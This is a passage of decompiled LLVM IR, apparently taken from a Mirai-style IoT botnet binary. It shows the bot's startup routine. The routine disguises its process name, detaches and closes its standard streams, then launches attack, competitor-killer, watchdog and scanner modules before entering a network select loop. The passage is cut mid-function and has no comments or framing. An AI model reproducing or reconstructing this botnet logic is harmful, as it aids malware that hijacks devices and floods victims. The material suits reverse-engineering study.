  store i32 %v2_804e37f, i32* %edi.global-to-local, align 4
  store i32 %v2_804e369, i32* %edx.global-to-local, align 4
  store i32 %v2_804e369, i32* %stack_var_-1452, align 4
  %v0_804e388 = load i32, i32* @esi, align 4
  %v1_804e388 = inttoptr i32 %v0_804e388 to i32*
  %v2_804e388 = load i32, i32* %v1_804e388, align 4
  store i32 %v2_804e388, i32* %ecx.global-to-local, align 4
  store i32 %v2_804e388, i32* %stack_var_-1456, align 4
  %v2_804e38b = inttoptr i32 %v2_804e388 to i8*
  %v3_804e38b = call i32 @util_strcpy(i8* %v2_804e38b, i32 %v2_804e369)
  %v2_804e390 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e390, i32* @eax, align 4
  %v2_804e391 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e391, i32* %edx.global-to-local, align 4
  store i32 32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e369, i32* %ecx.global-to-local, align 4
  store i32 %v2_804e369, i32* %stack_var_-1456, align 4
  %v2_804e39c = call i32 @util_zero(i32 %v2_804e369, i32 32)
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e3a1 = call i32 @rand_next(i32 %v0_804e3a1)
  store i32 %v1_804e3a1, i32* @ebp, align 4
  %v2_804e3a8 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v0_804e3a9 = load i32, i32* @esi, align 4
  %v1_804e3a9 = inttoptr i32 %v0_804e3a9 to i32*
  %v2_804e3a9 = load i32, i32* %v1_804e3a9, align 4
  store i32 %v2_804e3a9, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3a9, i32* %stack_var_-1456, align 4
  %v1_804e3ac = inttoptr i32 %v2_804e3a9 to i8*
  %v2_804e3ac = call i32 @util_strlen(i8* %v1_804e3ac)
  store i32 %v2_804e3ac, i32* %eax.global-to-local, align 4
  %v0_804e3b1 = load i32, i32* @esi, align 4
  %v1_804e3b1 = inttoptr i32 %v0_804e3b1 to i32*
  %v2_804e3b1 = load i32, i32* %v1_804e3b1, align 4
  store i32 %v2_804e3ac, i32* @edi, align 4
  %v2_804e3b5 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e3b5, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3b1, i32* %stack_var_-1456, align 4
  %v1_804e3b7 = inttoptr i32 %v2_804e3b1 to i8*
  %v2_804e3b7 = call i32 @util_strlen(i8* %v1_804e3b7)
  %v1_804e3c2 = load i32, i32* @edi, align 4
  %v2_804e3c2 = sub i32 20, %v1_804e3c2
  store i32 %v2_804e3c2, i32* %ecx.global-to-local, align 4
  %v0_804e3c4 = load i32, i32* @ebp, align 4
  %v5_804e3c6 = sext i32 %v2_804e3c2 to i64
  %v6_804e3cc = zext i32 %v0_804e3c4 to i64
  %v14_804e3cc = urem i64 %v6_804e3cc, %v5_804e3c6
  %v15_804e3cc = trunc i64 %v14_804e3cc to i32
  %v2_804e3d0 = add i32 %v15_804e3cc, %v2_804e3b7
  store i32 %v2_804e3d0, i32* @ebx, align 4
  %v2_804e3d3 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e3d3, i32* %edx.global-to-local, align 4
  store i32 %v2_804e3d0, i32* %stack_var_-1452, align 4
  store i32 %v2_804e369, i32* %eax.global-to-local, align 4
  store i32 %v2_804e369, i32* %stack_var_-1456, align 4
  %v3_804e3dd = call i32 @rand_alphastr(i8* %v2_804e371, i32 %v2_804e3d0)
  %v0_804e3e2 = load i32, i32* @esp, align 4
  %v1_804e3e2 = load i32, i32* @ebx, align 4
  %v2_804e3e2 = add i32 %v0_804e3e2, 1352
  %v3_804e3e2 = add i32 %v2_804e3e2, %v1_804e3e2
  %v4_804e3e2 = inttoptr i32 %v3_804e3e2 to i8*
  store i8 0, i8* %v4_804e3e2, align 1
  %v2_804e3ea = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e3ea, i32* @ebp, align 4
  %v2_804e3eb = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e3eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804e369, i32* %edx.global-to-local, align 4
  store i32 %v2_804e369, i32* %stack_var_-1452, align 4
  store i32 15, i32* %stack_var_-1456, align 4
  %v2_804e3f6 = call i32 @prctl(i32 15, i32 %v2_804e369)
  store i32 %v2_804e3f6, i32* %eax.global-to-local, align 4
  store i32 5, i32* %stack_var_-1456, align 4
  %v2_804e402 = call i32 @table_unlock_val(i8 5)
  %v2_804e407 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e407, i32* @esi, align 4
  %v2_804e408 = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e408, i32* @edi, align 4
  %v2_804e409 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e409, i32* %eax.global-to-local, align 4
  store i32 %v2_804e409, i32* %stack_var_-1452, align 4
  store i32 5, i32* %stack_var_-1456, align 4
  %v3_804e413 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-32)
  store i32 %v3_804e413, i32* @eax, align 4
  %v3_804e41b = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_804e41b, i32* @ebx, align 4
  store i32 %v3_804e41b, i32* %stack_var_-1448, align 4
  store i32 %v3_804e413, i32* %stack_var_-1452, align 4
  store i32 1, i32* %stack_var_-1456, align 4
  %v3_804e426 = call i32 @__GI___libc_write(i32 1, i32 %v3_804e413, i32 %v3_804e41b)
  store i32 %v3_804e426, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1448, align 4
  store i32 ptrtoint (i32* @global_var_8055867.38 to i32), i32* %stack_var_-1452, align 4
  store i32 1, i32* %stack_var_-1456, align 4
  %v3_804e437 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_8055867.38 to i32), i32 1)
  store i32 %v3_804e437, i32* %eax.global-to-local, align 4
  store i32 5, i32* %stack_var_-1456, align 4
  %v2_804e443 = call i32 @table_lock_val(i8 5)
  store i32 %v2_804e443, i32* %eax.global-to-local, align 4
  %v0_804e448 = call i32 @attack_init()
  store i32 %v0_804e448, i32* %eax.global-to-local, align 4
  %v0_804e44d = call i32 @killer_init()
  store i32 %v0_804e44d, i32* %eax.global-to-local, align 4
  %v0_804e452 = call i32 @watchdog_maintain()
  store i32 %v0_804e452, i32* %eax.global-to-local, align 4
  %v0_804e457 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e457 = call i32 @__libc_fork(i32 %v0_804e457)
  store i32 %v1_804e457, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v1_804e457, 1
  br i1 %tmp37, label %dec_label_pc_804e4bd, label %dec_label_pc_804e463

dec_label_pc_804e463:                             ; preds = %dec_label_pc_804e32e
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804e46b = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_804e46b, i32* %ecx.global-to-local, align 4
  store i32 %v0_804e27b, i32* %edi.global-to-local, align 4
  store i32 %v0_804e27a, i32* %ebp.global-to-local, align 4
  ret i32 0

dec_label_pc_804e474:                             ; preds = %entry
  %v0_804e477 = load i32, i32* @esi, align 4
  %v1_804e477 = add i32 %v0_804e477, 4
  %v2_804e477 = inttoptr i32 %v1_804e477 to i32*
  %v3_804e477 = load i32, i32* %v2_804e477, align 4
  store i32 %v3_804e477, i32* %eax.global-to-local, align 4
  store i32 %v3_804e477, i32* %stack_var_-1456, align 4
  %v1_804e47b = inttoptr i32 %v3_804e477 to i8*
  %v2_804e47b = call i32 @util_strlen(i8* %v1_804e47b)
  store i32 %v2_804e47b, i32* @eax, align 4
  %v1_804e483 = add i32 %v2_804e47b, -31
  %v6_804e483 = sub i32 30, %v2_804e47b
  %v7_804e483 = and i32 %v6_804e483, %v2_804e47b
  %v8_804e483 = icmp slt i32 %v7_804e483, 0
  %v9_804e483 = icmp eq i32 %v1_804e483, 0
  %v10_804e483 = icmp slt i32 %v1_804e483, 0
  %v3_804e486 = icmp eq i1 %v10_804e483, %v8_804e483
  %v4_804e486 = icmp eq i1 %v9_804e483, false
  %v5_804e486 = and i1 %v4_804e486, %v3_804e486
  br i1 %v5_804e486, label %dec_label_pc_804e32e, label %dec_label_pc_804e48c

dec_label_pc_804e48c:                             ; preds = %dec_label_pc_804e474
  store i32 %v2_804e47b, i32* %stack_var_-1448, align 4
  %v0_804e48e = load i32, i32* @esi, align 4
  %v1_804e48e = add i32 %v0_804e48e, 4
  %v2_804e48e = inttoptr i32 %v1_804e48e to i32*
  %v3_804e48e = load i32, i32* %v2_804e48e, align 4
  store i32 %v3_804e48e, i32* %ebp.global-to-local, align 4
  store i32 %v3_804e48e, i32* %stack_var_-1452, align 4
  store i32 %v2_804e315, i32* %edx.global-to-local, align 4
  store i32 %v2_804e315, i32* %stack_var_-1456, align 4
  %v2_804e49a = bitcast i32* %stack_var_-136 to i8*
  %v3_804e49a = call i32 @util_strcpy(i8* %v2_804e49a, i32 %v2_804e47b)
  store i32 %v3_804e49a, i32* %eax.global-to-local, align 4
  %v2_804e49f = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e49f, i32* %edi.global-to-local, align 4
  %v0_804e4a0 = load i32, i32* @esi, align 4
  %v1_804e4a0 = add i32 %v0_804e4a0, 4
  %v2_804e4a0 = inttoptr i32 %v1_804e4a0 to i32*
  %v3_804e4a0 = load i32, i32* %v2_804e4a0, align 4
  store i32 %v3_804e4a0, i32* %stack_var_-1456, align 4
  %v1_804e4a4 = inttoptr i32 %v3_804e4a0 to i8*
  %v2_804e4a4 = call i32 @util_strlen(i8* %v1_804e4a4)
  store i32 %v2_804e4a4, i32* %eax.global-to-local, align 4
  %v2_804e4a9 = load i32, i32* %stack_var_-1456, align 4
  store i32 %v2_804e4a9, i32* %edx.global-to-local, align 4
  %v2_804e4aa = load i32, i32* %stack_var_-1452, align 4
  store i32 %v2_804e4aa, i32* %ecx.global-to-local, align 4
  store i32 %v2_804e4a4, i32* %stack_var_-1452, align 4
  %v0_804e4ac = load i32, i32* @esi, align 4
  %v1_804e4ac = add i32 %v0_804e4ac, 4
  %v2_804e4ac = inttoptr i32 %v1_804e4ac to i32*
  %v3_804e4ac = load i32, i32* %v2_804e4ac, align 4
  store i32 %v3_804e4ac, i32* @eax, align 4
  store i32 %v3_804e4ac, i32* %stack_var_-1456, align 4
  %v2_804e4b0 = call i32 @util_zero(i32 %v3_804e4ac, i32 %v2_804e4a4)
  store i32 %v2_804e4b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e32e

dec_label_pc_804e4bd:                             ; preds = %dec_label_pc_804e32e
  %v0_804e4bd = call i32 @__GI_setsid()
  store i32 %v0_804e4bd, i32* @eax, align 4
  store i32 0, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-1456, align 4
  %v1_804e4cd = call i32 @__GI___libc_close(i32 0)
  store i32 %v1_804e4cd, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1456, align 4
  %v1_804e4d9 = call i32 @__GI___libc_close(i32 1)
  store i32 %v1_804e4d9, i32* @eax, align 4
  store i32 2, i32* %stack_var_-1456, align 4
  %v1_804e4e5 = call i32 @__GI___libc_close(i32 2)
  store i32 %v1_804e4e5, i32* %eax.global-to-local, align 4
  %v0_804e4ea = call i32 @attack_init()
  store i32 %v0_804e4ea, i32* %eax.global-to-local, align 4
  %v0_804e4ef = call i32 @killer_init()
  store i32 %v0_804e4ef, i32* %eax.global-to-local, align 4
  %v0_804e4f4 = call i32 @watchdog_maintain()
  store i32 %v0_804e4f4, i32* %eax.global-to-local, align 4
  %v0_804e4f9 = call i32 @scanner_init()
  store i32 %v0_804e4f9, i32* %eax.global-to-local, align 4
  %v2_804e501 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_804e501, i32* @esi, align 4
  %v2_804e508 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_804e508, i32* @ebx, align 4
  br label %dec_label_pc_804e510

dec_label_pc_804e510:                             ; preds = %dec_label_pc_804e510.backedge, %dec_label_pc_804e4bd
  %v0_804e519 = phi i32 [ %v0_804e519.pre, %dec_label_pc_804e510.backedge ], [ %v2_804e501, %dec_label_pc_804e4bd ]
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804e519 = inttoptr i32 %v0_804e519 to i8*
  store i32 %v0_804e519, i32* %edi.global-to-local, align 4
  %v5_804e51c = call i8* @_memset(i8* %v1_804e519, i32 0, i32 32)
  %v0_804e51e = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e51e, i32* %ecx.global-to-local, align 4
  %v0_804e520 = load i32, i32* @ebx, align 4
  %v1_804e520 = inttoptr i32 %v0_804e520 to i8*
  store i32 %v0_804e520, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804e523 = call i8* @_memset(i8* %v1_804e520, i32 0, i32 %v0_804e51e)
  %v6_804e523 = ptrtoint i8* %v5_804e523 to i32
  store i32 %v6_804e523, i32* %ecx.global-to-local, align 4
  %v0_804e525 = load i32, i32* @global_var_8057b94.34, align 4
  store i32 %v0_804e525, i32* %edx.global-to-local, align 4
  %v10_804e52b = icmp eq i32 %v0_804e525, -1
  br i1 %v10_804e52b, label %dec_label_pc_804e540, label %dec_label_pc_804e530

dec_label_pc_804e530:                             ; preds = %dec_label_pc_804e510
  %v1_804e532 = urem i32 %v0_804e525, 32
  store i32 %v1_804e532, i32* %edx.global-to-local, align 4
  %v2_804e535 = udiv i32 %v0_804e525, 32
  store i32 %v2_804e535, i32* %eax.global-to-local, align 4
  %v0_804e538 = load i32, i32* @esp, align 4
  %v2_804e538 = mul nuw nsw i32 %v2_804e535, 4
  %v3_804e538 = add nuw nsw i32 %v2_804e538, 1176
  %v4_804e538 = add i32 %v3_804e538, %v0_804e538
  %v5_804e538 = inttoptr i32 %v4_804e538 to i32*
  %v6_804e538 = load i32, i32* %v5_804e538, align 4
  %v9_804e538 = shl i32 1, %v1_804e532
  %v12_804e538 = or i32 %v6_804e538, %v9_804e538
  store i32 %v12_804e538, i32* %v5_804e538, align 4
  br label %dec_label_pc_804e540

dec_label_pc_804e540:                             ; preds = %dec_label_pc_804e510, %dec_label_pc_804e530
  %v0_804e540 = load i32, i32* @global_var_8057b98.39, align 8
  %v10_804e540 = icmp eq i32 %v0_804e540, -1
  %v1_804e720 = load i32, i32* @esp, align 4
  br i1 %v10_804e540, label %dec_label_pc_804e720, label %dec_label_pc_804e54d

dec_label_pc_804e54d:                             ; preds = %dec_label_pc_804e540, %dec_label_pc_804e720, %dec_label_pc_804e76a
  %v13_804e671 = phi i32 [ %v1_804e72c, %dec_label_pc_804e720 ], [ %v1_804e784, %dec_label_pc_804e76a ], [ %v1_804e720, %dec_label_pc_804e540 ]
  %v0_804e664 = phi i32 [ -1, %dec_label_pc_804e720 ], [ %v0_804e664.pre, %dec_label_pc_804e76a ], [ %v0_804e540, %dec_label_pc_804e540 ]
  %v0_804e54d = load i8, i8* @global_var_8057d30.40, align 16
  %v1_804e54d = icmp eq i8 %v0_804e54d, 0
  %v1_804e66b = urem i32 %v0_804e664, 32
  store i32 %v1_804e66b, i32* %eax.global-to-local, align 4
  %v2_804e66e = udiv i32 %v0_804e664, 32
  store i32 %v2_804e66e, i32* %edx.global-to-local, align 4
  %v2_804e671 = mul nuw nsw i32 %v2_804e66e, 4
  br i1 %v1_804e54d, label %dec_label_pc_804e664, label %dec_label_pc_804e55a

dec_label_pc_804e55a:                             ; preds = %dec_label_pc_804e54d
  %v3_804e567 = add i32 %v13_804e671, 1048
  %v4_804e567 = add i32 %v3_804e567, %v2_804e671
  %v5_804e567 = inttoptr i32 %v4_804e567 to i32*
  %v6_804e567 = load i32, i32* %v5_804e567, align 4
  %v9_804e567 = shl i32 1, %v1_804e66b
  %v12_804e567 = or i32 %v6_804e567, %v9_804e567
  store i32 %v12_804e567, i32* %v5_804e567, align 4
  br label %dec_label_pc_804e56f

dec_label_pc_804e56f:                             ; preds = %dec_label_pc_804e664, %dec_label_pc_804e55a
  %v0_804e56f = load i32, i32* @global_var_8057b94.34, align 4
  store i32 %v0_804e56f, i32* %edx.global-to-local, align 4
  %v0_804e575 = load i32, i32* @global_var_8057b98.39, align 8
  %v5_804e57c = icmp slt i32 %v0_804e575, %v0_804e56f
  br i1 %v5_804e57c, label %dec_label_pc_804e57e, label %dec_label_pc_804e580

dec_label_pc_804e57e:                             ; preds = %dec_label_pc_804e56f
  br label %dec_label_pc_804e580

dec_label_pc_804e580:                             ; preds = %dec_label_pc_804e56f, %dec_label_pc_804e57e
  %storemerge = phi i32 [ %v0_804e56f, %dec_label_pc_804e57e ], [ %v0_804e575, %dec_label_pc_804e56f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_804e580 = load i32, i32* @esp, align 4
  %v1_804e580 = add i32 %v0_804e580, 1388
  %v2_804e580 = inttoptr i32 %v1_804e580 to i32*
  store i32 0, i32* %v2_804e580, align 4
  %v0_804e58b = load i32, i32* @esp, align 4
  %v1_804e58b = add i32 %v0_804e58b, 1384
  %v2_804e58b = inttoptr i32 %v1_804e58b to i32*
  store i32 10, i32* %v2_804e58b, align 4
  %v0_804e596 = load i32, i32* @esp, align 4
  %v0_804e599 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e599 = add i32 %v0_804e599, 1
  store i32 %v1_804e599, i32* %eax.global-to-local, align 4
  %v1_804e59a = add i32 %v0_804e596, 1384
  store i32 %v1_804e59a, i32* %edx.global-to-local, align 4
  %v2_804e5a1 = add i32 %v0_804e596, -16
  %v3_804e5a1 = inttoptr i32 %v2_804e5a1 to i32*
  store i32 %v1_804e59a, i32* %v3_804e5a1, align 4
  %v1_804e5a2 = add i32 %v0_804e596, -20
  %v2_804e5a2 = inttoptr i32 %v1_804e5a2 to i32*
  store i32 0, i32* %v2_804e5a2, align 4
  %v0_804e5a4 = load i32, i32* @ebx, align 4
  %v2_804e5a4 = add i32 %v0_804e596, -24
  %v3_804e5a4 = inttoptr i32 %v2_804e5a4 to i32*
  store i32 %v0_804e5a4, i32* %v3_804e5a4, align 4
  %v0_804e5a5 = load i32, i32* @esi, align 4
  %v2_804e5a5 = add i32 %v0_804e596, -28
  %v3_804e5a5 = inttoptr i32 %v2_804e5a5 to i32*
  store i32 %v0_804e5a5, i32* %v3_804e5a5, align 4
  %v0_804e5a6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e5a6 = add i32 %v0_804e596, -32
  %v3_804e5a6 = inttoptr i32 %v2_804e5a6 to i32*
  store i32 %v0_804e5a6, i32* %v3_804e5a6, align 4
  %v0_804e5a7 = call i32 @__libc_select()
  store i32 %v0_804e5a7, i32* %eax.global-to-local, align 4
  %v0_804e5ac = load i32, i32* @esp, align 4
  %v10_804e5af = icmp eq i32 %v0_804e5a7, -1
  br i1 %v10_804e5af, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e5b8

dec_label_pc_804e5b8:                             ; preds = %dec_label_pc_804e580
  %v1_804e5b8 = icmp eq i32 %v0_804e5a7, 0
  %v1_804e5ba = icmp eq i1 %v1_804e5b8, false
  br i1 %v1_804e5ba, label %dec_label_pc_804e5dc, label %dec_label_pc_804e5bc

dec_label_pc_804e5bc:                             ; preds = %dec_label_pc_804e5b8
  %v1_804e5bc = and i32 %v0_804e5a7, -256
  %v2_804e5bc = or i32 %v1_804e5bc, 6
  %v0_804e5be = load i32, i32* @ebp, align 4
  store i32 %v2_804e5bc, i32* %ecx.global-to-local, align 4
  %v2_804e5c4 = ashr i32 %v0_804e5be, 31
  %v1_804e5c7 = add i32 %v0_804e5be, 1
  store i32 %v1_804e5c7, i32* @ebp, align 4
  %v2_804e5c8 = zext i32 %v0_804e5be to i64
  %v4_804e5c8 = zext i32 %v2_804e5c4 to i64
  %v5_804e5c8 = mul nuw i64 %v4_804e5c8, 4294967296
  %v6_804e5c8 = or i64 %v5_804e5c8, %v2_804e5c8
  %v7_804e5c8 = zext i32 %v2_804e5bc to i64
  %v8_804e5c8 = sdiv i64 %v6_804e5c8, %v7_804e5c8
  %v9_804e5c8 = trunc i64 %v8_804e5c8 to i32
  store i32 %v9_804e5c8, i32* %eax.global-to-local, align 4
  %v10_804e5c8 = srem i64 %v6_804e5c8, %v7_804e5c8
  %v11_804e5c8 = trunc i64 %v10_804e5c8 to i32
  store i32 %v11_804e5c8, i32* %edx.global-to-local, align 4
  %v1_804e5ca = add i32 %v0_804e5ac, 1446
  %v2_804e5ca = inttoptr i32 %v1_804e5ca to i16*
  store i16 0, i16* %v2_804e5ca, align 2
  %v1_804e5d4 = icmp eq i32 %v11_804e5c8, 0
  br i1 %v1_804e5d4, label %dec_label_pc_804e78c, label %dec_label_pc_804e5dc

dec_label_pc_804e5dc:                             ; preds = %dec_label_pc_804e5bc, %dec_label_pc_804e5b8, %dec_label_pc_804e78c
  %v0_804e5dc = load i32, i32* @global_var_8057b94.34, align 4
  store i32 %v0_804e5dc, i32* %ecx.global-to-local, align 4
  %v10_804e5e2 = icmp eq i32 %v0_804e5dc, -1
  br i1 %v10_804e5e2, label %dec_label_pc_804e604, label %dec_label_pc_804e5e7

dec_label_pc_804e5e7:                             ; preds = %dec_label_pc_804e5dc
  %v2_804e5eb = udiv i32 %v0_804e5dc, 32
  store i32 %v2_804e5eb, i32* %edx.global-to-local, align 4
  %v1_804e5ee = urem i32 %v0_804e5dc, 32
  store i32 %v1_804e5ee, i32* %eax.global-to-local, align 4
  %v0_804e5f1 = load i32, i32* @esp, align 4
  %v2_804e5f1 = mul nuw nsw i32 %v2_804e5eb, 4
  %v3_804e5f1 = add nuw nsw i32 %v2_804e5f1, 1176
  %v4_804e5f1 = add i32 %v3_804e5f1, %v0_804e5f1
  %v5_804e5f1 = inttoptr i32 %v4_804e5f1 to i32*
  %v6_804e5f1 = load i32, i32* %v5_804e5f1, align 4
  %v9_804e5f1 = shl i32 1, %v1_804e5ee
  %v10_804e5f1 = and i32 %v6_804e5f1, %v9_804e5f1
  %v11_804e5f1 = icmp ne i32 %v10_804e5f1, 0
  %v1_804e5f9 = zext i1 %v11_804e5f1 to i32
  store i32 %v1_804e5f9, i32* %eax.global-to-local, align 4
  %v4_804e5fc = icmp eq i1 %v11_804e5f1, false
  %v1_804e5fe = icmp eq i1 %v4_804e5fc, false
  br i1 %v1_804e5fe, label %dec_label_pc_804e842, label %dec_label_pc_804e604

dec_label_pc_804e604:                             ; preds = %dec_label_pc_804e5e7, %dec_label_pc_804e5dc
  %v0_804e604 = load i8, i8* @global_var_8057d30.40, align 16
  %v1_804e604 = icmp eq i8 %v0_804e604, 0
  %v0_804e67e = load i32, i32* @global_var_8057b98.39, align 8
  br i1 %v1_804e604, label %dec_label_pc_804e67e, label %dec_label_pc_804e60d

dec_label_pc_804e60d:                             ; preds = %dec_label_pc_804e604
  store i32 %v0_804e67e, i32* %ecx.global-to-local, align 4
  store i8 0, i8* @global_var_8057d30.40, align 16
  %v2_804e61e = udiv i32 %v0_804e67e, 32
  store i32 %v2_804e61e, i32* %edx.global-to-local, align 4
  %v1_804e621 = urem i32 %v0_804e67e, 32
  store i32 %v1_804e621, i32* %eax.global-to-local, align 4
  %v0_804e624 = load i32, i32* @esp, align 4
  %v2_804e624 = mul nuw nsw i32 %v2_804e61e, 4
  %v3_804e624 = add nuw nsw i32 %v2_804e624, 1048
  %v4_804e624 = add i32 %v3_804e624, %v0_804e624
  %v5_804e624 = inttoptr i32 %v4_804e624 to i32*
  %v6_804e624 = load i32, i32* %v5_804e624, align 4
  %v9_804e624 = shl i32 1, %v1_804e621
  %v10_804e624 = and i32 %v6_804e624, %v9_804e624
  %v11_804e624 = icmp ne i32 %v10_804e624, 0
  %v1_804e62c = zext i1 %v11_804e624 to i32
  store i32 %v1_804e62c, i32* @eax, align 4
  %v4_804e62f = icmp eq i1 %v11_804e624, false
  %v1_804e631 = icmp eq i1 %v4_804e62f, false
  br i1 %v1_804e631, label %dec_label_pc_804e7ae, label %dec_label_pc_804e637

dec_label_pc_804e637:                             ; preds = %dec_label_pc_804e60d
  %v10_804e637 = icmp eq i32 %v0_804e67e, -1
  br i1 %v10_804e637, label %dec_label_pc_804e648, label %dec_label_pc_804e63c

dec_label_pc_804e63c:                             ; preds = %dec_label_pc_804e637
  %v2_804e63f = add i32 %v0_804e624, -16
  %v3_804e63f = inttoptr i32 %v2_804e63f to i32*
  store i32 %v0_804e67e, i32* %v3_804e63f, align 4
  %v0_804e640 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e640 = call i32 @__GI___libc_close(i32 %v0_804e640)
  store i32 %v1_804e640, i32* %eax.global-to-local, align 4
  %v0_804e645 = load i32, i32* @esp, align 4
  %v1_804e645 = add i32 %v0_804e645, 16
  br label %dec_label_pc_804e648

dec_label_pc_804e648:                             ; preds = %dec_label_pc_804e93c, %dec_label_pc_804e637, %dec_label_pc_804e94a, %dec_label_pc_804e63c
  %v0_804e648 = phi i32 [ %v0_804e94a, %dec_label_pc_804e93c ], [ %v0_804e624, %dec_label_pc_804e637 ], [ %v1_804e953, %dec_label_pc_804e94a ], [ %v1_804e645, %dec_label_pc_804e63c ]
  store i32 -1, i32* @global_var_8057b98.39, align 8
  %v1_804e655 = add i32 %v0_804e648, -16
  %v2_804e655 = inttoptr i32 %v1_804e655 to i32*
  store i32 1, i32* %v2_804e655, align 4
  %v0_804e657 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e657 = call i32 @sleep(i32 %v0_804e657)
  store i32 %v1_804e657, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e510.backedge

dec_label_pc_804e510.backedge:                    ; preds = %dec_label_pc_804e648, %dec_label_pc_804e6fe, %dec_label_pc_804e7f3, %dec_label_pc_804e902, %dec_label_pc_804e97f, %dec_label_pc_804ea33, %dec_label_pc_804e580, %dec_label_pc_804e67e, %dec_label_pc_804e68d, %dec_label_pc_804e89a, %dec_label_pc_804e928, %dec_label_pc_804e933, %dec_label_pc_804e9d4
  %v0_804e519.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e510

dec_label_pc_804e664:                             ; preds = %dec_label_pc_804e54d
  %v3_804e671 = add i32 %v13_804e671, 1176
  %v4_804e671 = add i32 %v3_804e671, %v2_804e671
  %v5_804e671 = inttoptr i32 %v4_804e671 to i32*
  %v6_804e671 = load i32, i32* %v5_804e671, align 4
  %v9_804e671 = shl i32 1, %v1_804e66b
  %v12_804e671 = or i32 %v6_804e671, %v9_804e671
  store i32 %v12_804e671, i32* %v5_804e671, align 4
  br label %dec_label_pc_804e56f

dec_label_pc_804e67e:                             ; preds = %dec_label_pc_804e604
  store i32 %v0_804e67e, i32* %edx.global-to-local, align 4
  %v10_804e684 = icmp eq i32 %v0_804e67e, -1
  br i1 %v10_804e684, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e68d

dec_label_pc_804e68d:                             ; preds = %dec_label_pc_804e67e
  %v2_804e68f = udiv i32 %v0_804e67e, 32
  store i32 %v2_804e68f, i32* %edx.global-to-local, align 4
  %v1_804e692 = urem i32 %v0_804e67e, 32
  store i32 %v1_804e692, i32* %eax.global-to-local, align 4
  %v0_804e695 = load i32, i32* @esp, align 4
  %v2_804e695 = mul nuw nsw i32 %v2_804e68f, 4
  %v3_804e695 = add nuw nsw i32 %v2_804e695, 1176
  %v4_804e695 = add i32 %v3_804e695, %v0_804e695
  %v5_804e695 = inttoptr i32 %v4_804e695 to i32*
  %v6_804e695 = load i32, i32* %v5_804e695, align 4
  %v9_804e695 = shl i32 1, %v1_804e692
  %v10_804e695 = and i32 %v6_804e695, %v9_804e695
  %v11_804e695 = icmp ne i32 %v10_804e695, 0
  %v1_804e69d = zext i1 %v11_804e695 to i32
  store i32 %v1_804e69d, i32* %eax.global-to-local, align 4
  %v4_804e6a0 = icmp eq i1 %v11_804e695, false
  br i1 %v4_804e6a0, label %dec_label_pc_804e510.backedge, label %dec_label_pc_804e6a8

dec_label_pc_804e6a8:                             ; preds = %dec_label_pc_804e68d
  %v1_804e6a8 = add i32 %v0_804e695, 1414
  %v2_804e6a8 = inttoptr i32 %v1_804e6a8 to i16*
  store i16 0, i16* %v2_804e6a8, align 2
  %v0_804e6b2 = load i32, i32* %stack_var_-1456, align 4
  %v1_804e6b2 = load i32, i32* %stack_var_-1452, align 4
  %v2_804e6b2 = call i32 @__GI___errno_location(i32 %v0_804e6b2, i32 %v1_804e6b2)
  store i32 %v2_804e6b2, i32* @edi, align 4
  %v1_804e6b9 = inttoptr i32 %v2_804e6b2 to i32*
  store i32 0, i32* %v1_804e6b9, align 4
  %v0_804e6bf = load i32, i32* @esp, align 4
  %v1_804e6bf = add i32 %v0_804e6bf, -4
  %v2_804e6bf = inttoptr i32 %v1_804e6bf to i32*
  store i32 16386, i32* %v2_804e6bf, align 4
  %v1_804e6c4 = add i32 %v0_804e6bf, -8
  %v2_804e6c4 = inttoptr i32 %v1_804e6c4 to i32*
  store i32 2, i32* %v2_804e6c4, align 4
  %v1_804e6c6 = add i32 %v0_804e6bf, 1414
  store i32 %v1_804e6c6, i32* %edx.global-to-local, align 4
  %v2_804e6cd = add i32 %v0_804e6bf, -12
  %v3_804e6cd = inttoptr i32 %v2_804e6cd to i32*
  store i32 %v1_804e6c6, i32* %v3_804e6cd, align 4
  %v0_804e6ce = load i32, i32* @global_var_8057b98.39, align 8
  store i32 %v0_804e6ce, i32* %eax.global-to-local, align 4
  %v2_804e6d3 = add i32 %v0_804e6bf, -16
  %v3_804e6d3 = inttoptr i32 %v2_804e6d3 to i32*
